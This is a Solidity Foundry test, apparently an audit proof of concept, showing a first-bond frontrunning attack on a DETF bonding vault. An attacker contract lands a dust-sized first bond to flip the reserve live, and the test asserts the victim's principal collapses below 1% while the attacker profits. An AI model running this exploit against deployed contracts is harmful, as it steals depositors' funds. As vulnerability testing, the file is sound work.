// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IDetfBondNFT} from "contracts/interfaces/IDetfBondNFT.sol";
import {IStakedDETF, IDETFFundedRewards} from "contracts/interfaces/IStakedDETF.sol";
import {DETFFundedStakingMath} from "contracts/vaults/detf/common/core/DETFFundedStakingMath.sol";
import {IUniswapV4SeBufferHook} from "contracts/hooks/uniswap/v4/interfaces/IUniswapV4SeBufferHook.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {TestBase_UniswapV4Detf} from "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/TestBase_UniswapV4Detf.sol";
import {TestBase_UniswapV4Detf_Weighted} from "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/TestBase_UniswapV4Detf_Weighted.sol";

interface IDryBondEntry {
    function bond(IERC20 tokenIn, uint256 amountIn, uint256 lockDuration, address recipient, bool pretransferred, uint256 deadline)
        external returns (uint256 tokenId, uint256 shares);
    function previewBond(IERC20 tokenIn, uint256 amountIn, uint256 lockDuration) external view returns (uint256);
    function isReserveLive() external view returns (bool);
}

/// @notice Unprivileged contract: makes the smallest first bond that succeeds (flips the reserve live).
contract DryDustFirstBonder {
    function run(address detf, IERC20 pair, uint256 lock, address to) external returns (uint256 used, uint256 id) {
        return run2(detf, pair, IERC20(address(0)), lock, to);
    }
    function run2(address detf, IERC20 pair, IERC20 other, uint256 lock, address to) public returns (uint256 used, uint256 id) {
        pair.approve(detf, type(uint256).max);
        if (address(other) != address(0)) other.approve(detf, type(uint256).max);
        for (uint256 a = 1e9; a <= 1e18; a *= 10) {
            try IDryBondEntry(detf).bond(pair, a, lock, to, false, block.timestamp) returns (uint256 tid, uint256) {
                return (a, tid);
            } catch {}
        }
        revert("no dust size worked");
    }
}

library DryR5Reserves {
    function get(address hook, address token) internal view returns (uint256 r) {
        IUniswapV4SeBufferHook h = IUniswapV4SeBufferHook(hook);
        uint256[] memory amts = h.previewExitProportional(IERC20(hook).totalSupply());
        address[] memory toks = h.tokens();
        for (uint256 i; i < toks.length; ++i) if (toks[i] == token) r = amts[i];
    }
}

abstract contract DryFirstBondFrontrunLogic is TestBase_UniswapV4Detf {
    function _other() internal view virtual returns (IERC20) { return IERC20(address(0)); }
    address attacker = makeAddr("attacker");
    uint256 constant VICTIM_BOND = 1_000 ether;

    function _principal(uint256 id) internal view returns (uint256) {
        return IDetfBondNFT(detfInfo.bondNftVault()).positionOf(id).principal;
    }

    function _claimUnstakeSell(uint256 id, address holder) internal returns (uint256 pairOut) {
        IDetfBondNFT nft = IDetfBondNFT(detfInfo.bondNftVault());
        DETFFundedStakingMath.BondPosition memory p = nft.positionOf(id);
        vm.warp(p.startTimestamp + p.vestingDuration + 1);
        IDETFFundedRewards(detf).synchronizeRewards();
        vm.prank(holder);
        nft.claimBond{gas: 30_000_000}(id, holder);
        IStakedDETF st = IStakedDETF(detfInfo.rebasingClaimToken());
        uint256 bal = st.balanceOf(holder);
        if (bal != 0) {
            vm.prank(holder);st.exchangeIn(IERC20(address(st)), bal, IERC20(detf), 0, holder, false, block.timestamp + 1 hours);
        }
        uint256 d = IERC20(detf).balanceOf(holder);
        uint256 before = pairToken.balanceOf(holder);
        vm.startPrank(holder);
        while (d > 0) {
            uint256 amt = DryR5Reserves.get(reserveHook, detf) / 5;
            if (amt == 0) break;
            if (amt > d) amt = d;
            IERC20(detf).approve(reserveHook, amt);IStandardExchangeIn(reserveHook).exchangeIn(IERC20(detf), amt, IERC20(address(pairToken)), 0, holder, false, block.timestamp + 1 hours);
            d -= amt;
        }
        vm.stopPrank();
        pairOut = pairToken.balanceOf(holder) - before;
    }

    function victimBondExt() external returns (uint256 id) {
        require(msg.sender == address(this));
        (id,) = _firstBond(VICTIM_BOND);
    }

    /// Honest victim's view before sending: reserve not live, preview at opening price.
    function test_firstBondTransition_frontrun() public {
        assertFalse(IDryBondEntry(detf).isReserveLive(), "pre-live");
        uint256 victimPreview = IDryBondEntry(detf).previewBond(IERC20(address(pairToken)), VICTIM_BOND, DEFAULT_MIN_LOCK);
        console2.log("victim previewBond before tx (pre-live, opening price) DETF 1e9", victimPreview);

        // ---- control: victim is the real first bonder
        uint256 snap = vm.snapshotState();
        (uint256 idC,) = _firstBond(VICTIM_BOND);
        uint256 principalC = _principal(idC);
        uint256 pairBackC = _claimUnstakeSell(idC, detfUser);
        console2.log("CONTROL principal (DETF 1e9)", principalC);
        console2.log("CONTROL victim pair realized after lock", pairBackC);
        vm.revertToState(snap);

        // ---- attack: unprivileged contract lands a dust first bond just before the victim
        DryDustFirstBonder dfb = new DryDustFirstBonder();
        pairToken.mint(address(dfb), 1 ether);
        if (address(_other()) != address(0)) SimpleMintableERC20(address(_other())).mint(address(dfb), 1 ether);
        uint256 attPairBefore = pairToken.balanceOf(address(dfb));
        (uint256 dustUsed, uint256 idA) = dfb.run2(detf, IERC20(address(pairToken)), _other(), DEFAULT_MIN_LOCK, attacker);
        console2.log("attacker dust first bond (pair wei)", dustUsed);
        console2.log("reserve after dust bond: DETF / pair", DryR5Reserves.get(reserveHook, detf), DryR5Reserves.get(reserveHook, address(pairToken)));
        assertTrue(IDryBondEntry(detf).isReserveLive(), "dust bond flipped reserve live");

        uint256 vicPairBefore = pairToken.balanceOf(detfUser);
        if (address(_other()) != address(0)) {
            // weighted: same honest call; report revert vs loss
            try this.victimBondExt() returns (uint256 idW) {
                console2.log("WEIGHTED victim bond succeeded, principal", _principal(idW));
                console2.log("WEIGHTED victim paid pair0", vicPairBefore - pairToken.balanceOf(detfUser));
            } catch (bytes memory r) {
                console2.log("WEIGHTED victim bond reverted, selector:");
                console2.logBytes(r);
            }
            return;
        }
        (uint256 idV,) = _firstBond(VICTIM_BOND); // same honest call, now executes in live mode
        uint256 principalV = _principal(idV);
        assertEq(vicPairBefore - pairToken.balanceOf(detfUser), VICTIM_BOND, "victim paid full amount");
        console2.log("ATTACK victim principal (DETF 1e9)", principalV);
        console2.log("reserve after victim bond: DETF / pair", DryR5Reserves.get(reserveHook, detf), DryR5Reserves.get(reserveHook, address(pairToken)));
        uint256 pairBackV = _claimUnstakeSell(idV, detfUser);
        console2.log("ATTACK victim pair realized after lock", pairBackV);

        uint256 attPrincipal = _principal(idA);
        uint256 attBack = _claimUnstakeSell(idA, attacker);
        console2.log("attacker principal / realized pair", attPrincipal, attBack);

        attPairBefore = attPairBefore - pairToken.balanceOf(address(dfb)); // reuse slot: attacker cost
        console2.log("ATTACKER NET PROFIT (pair wei)", attBack - attPairBefore);
        console2.log("VICTIM LOSS vs control (pair wei)", pairBackC - pairBackV);
        assertGt(attBack, attPairBefore, "attacker net profit > 0");
        assertLt(principalV * 100, principalC, "victim principal < 1% of control");
        assertLt(pairBackV * 10, pairBackC, "victim realized value < 10% of control");
    }
}

contract DryFirstBondFrontrun_Cp is DryFirstBondFrontrunLogic {}

contract DryFirstBondFrontrun_Weighted is DryFirstBondFrontrunLogic, TestBase_UniswapV4Detf_Weighted {
    function setUp() public virtual override(TestBase_UniswapV4Detf, TestBase_UniswapV4Detf_Weighted) {
        TestBase_UniswapV4Detf_Weighted.setUp();
    }
    function _other() internal view override returns (IERC20) { return IERC20(address(pair1)); }
    function _firstBond(uint256 a) internal override(TestBase_UniswapV4Detf, TestBase_UniswapV4Detf_Weighted) returns (uint256, uint256) {
        return TestBase_UniswapV4Detf_Weighted._firstBond(a);
    }
    function _assertNoJoinableDust() internal view override(TestBase_UniswapV4Detf, TestBase_UniswapV4Detf_Weighted) {
        TestBase_UniswapV4Detf_Weighted._assertNoJoinableDust();
    }
}
